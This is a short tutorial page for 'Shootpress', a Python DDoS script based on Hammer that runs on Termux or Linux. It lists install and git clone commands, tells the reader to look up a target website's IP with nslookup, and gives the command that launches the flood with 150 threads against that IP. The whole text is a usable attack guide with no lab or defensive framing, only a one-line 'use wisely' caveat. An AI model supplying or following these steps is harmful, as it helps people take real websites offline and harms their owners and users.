Shootpress is a script that functions as a tool in carrying out DDoS attacks that are developed based on Hammer. This script can run on Android using Termux, and can also run on Linux devices.<br>
<br>
Hope you can use this script wisely.<br>
<br>
<b>How to:</b><br>
$ apt update<br>
$ apt upgrade<br>
$ apt install python<br>
$ apt install git<br>
$ apt install dnsutils<br>
$ git clone https://github.com/ronidianpatisa/Shootpress/

Shootpress need the <b>Name Server</b> of a website which you want to attack...<br>
To get the Name Server...just type<br>
$ <b>nslookup example.com<b><br>
Note the IP Address of that Website<br>

then <br>
$ cd Shootpress<br>
$ python shootpress.py -s [ip Address] -t 150<br>
example:<br>
$ python shootpress.py -s 123.45.67.89 -t 150<br>
